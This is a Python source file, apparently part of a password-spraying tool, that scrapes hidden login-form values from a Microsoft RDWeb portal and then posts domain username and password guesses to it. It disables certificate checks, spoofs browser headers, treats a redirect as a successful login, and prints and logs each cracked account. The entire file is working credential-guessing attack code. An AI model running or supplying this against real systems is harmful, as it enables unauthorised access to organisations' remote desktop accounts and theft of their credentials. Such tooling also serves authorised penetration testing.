#!/usr/bin/env python3

import requests
import urllib.parse
from bs4 import BeautifulSoup as BS
import warnings
# This is to suppress the insecure warning. If there is a better way please let me know
from requests.packages.urllib3.exceptions import InsecureRequestWarning

warnings.simplefilter('ignore',InsecureRequestWarning)


'''Function to password guess against RDWEB endpoint.'''
def rdweb_conn(params):

    username = params.get("username")
    password = params.get("password")
    count = params.get("count")
    place = params.get("place")
    filelogger = params.get("filelogger")
    host = ''.join(params.get("host"))
    rdp_vars = params.get("rdp_vars")
    domain = rdp_vars[0].split('.')[1]
    username = domain + '\\' + username
    rdpurl = "https://{}/RDWeb/pages/en-US/login.aspx?ReturnUrl=/RDWeb/pages/en-US/Default.aspx".format(host)
    

    headers = {
        'Host': host,
        'Connection' : 'close',
        'Content-Length': '339',
        'Cache-Control': 'max-age=0',
        'Upgrade-Insecure-Requests' : '1',
        'Origin': 'https://{}'.format(host),
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-User': '?1',
        'Sec-Fetch-Dest': 'document',
        'Referer':'https://{}/RDWeb/pages/en-US/login.aspx?ReturnUrl=/RDWeb/pages/en-US/Default.aspx'.format(host),
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'en-US,en;q=0.9',
        'Cookie': 'TSWAFeatureCheckCookie=true'
    }

    data = f"WorkSpaceID={rdp_vars[0]}&RDPCertificates={rdp_vars[1]}&PublicModeTimeout=20&PrivateModeTimeout=240&WorkspaceFriendlyName={rdp_vars[2]}&EventLogUploadAddress=&RedirectorName={rdp_vars[3]}&ClaimsHint=&ClaimsToken=&isUtf8=1&flags=4&DomainUserName={username}&UserPass={password}&MachineType=private"

    try:

        # print the host , username and password being checked
        print(f"ACCOUNT CHECK: [RDWEB] Target: {host} User: {username} [{place} of {count}, {place} completed] Password: {password}")

        query = requests.post(rdpurl, data=data, verify=False, headers=headers)
        if len(query.history) > 0:
            print(f"ACCOUNT FOUND: [RDWEB] Target: {host} User: {username} Password: {password} [SUCCESS]")
            if filelogger != None:
                filelogger.debug(f"ACCOUNT FOUND: [RDWEB] Target: {host} User: {username} Password: {password} [SUCCESS]")
        elif query.status_code != 200:
            print("The Header Respose code to investigate: {}".format(query.status_code))
	
    except:
        pass

def rdweb_params(host):

    try:
        url_for_values = "https://{}/RDWeb/pages/en-US/login.aspx?ReturnUrl=/RDWeb/pages/en-US/Default.aspx".format(host)
        response = requests.get(url_for_values)
        soup = BS(response.text, "html.parser")

        wkspaceid = soup.find("input",{'name':'WorkSpaceID'}).attrs['value']
        rdpcert = soup.find("input",{'name':'RDPCertificates'}).attrs['value']
        pubtimeout = soup.find("input",{'name':'PublicModeTimeout'}).attrs['value']
        pvttimeout = soup.find("input",{'name':'PrivateModeTimeout'}).attrs['value']
        wksfrname = urllib.parse.unquote(soup.find("input",{'name':'WorkspaceFriendlyName'}).attrs['value'])
        eventlog = soup.find("input",{'name':'EventLogUploadAddress'}).attrs['value']
        redirector = soup.find("input",{'name':'RedirectorName'}).attrs['value']
        claimhint = soup.find("input",{'name':'ClaimsHint'}).attrs['value']
        claimtoken = soup.find("input",{'name':'ClaimsToken'}).attrs['value']

        return_var = [wkspaceid, rdpcert, wksfrname, redirector, pubtimeout, pvttimeout, eventlog, claimhint, claimtoken]

        return return_var

    except:
        pass
